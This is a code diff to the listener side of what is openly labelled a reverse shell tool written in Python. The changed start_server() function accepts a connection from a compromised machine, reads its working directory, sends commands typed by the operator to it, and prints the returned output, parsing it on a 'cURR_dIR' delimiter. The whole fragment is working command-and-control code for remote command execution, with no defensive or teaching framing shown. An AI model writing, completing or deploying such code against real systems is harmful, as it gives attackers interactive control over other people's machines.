@@ -15,17 +15,20 @@ def start_server():
         try:
             conn, addr = s.accept()
             print("Got connection from reverse shell in ", addr)
+            cwd = conn.recv(1024).decode()
+            if len(cwd)==0:
+                print("")
+                print("Client must have disconnected. len(cwd) == 0.")
+                break
             while s:
                 try:
-                    cwd = conn.recv(1024).decode()
-                    if len(cwd)==0:
-                        print("")
-                        print("Client must have disconnected. len(cwd) == 0.")
-                        break
-                    # print(cwd)
                     command = input(f"{cwd}> ")
                     print("command is ", command.encode())
                     conn.send(command.encode())
+                    response = conn.recv(1024).decode()
+                    output = response.split("cURR_dIR")[0]
+                    cwd = response.split("cURR_dIR")[1]
+                    print(output)
                 except:
                     print("Client must have disconnected.")
                     break
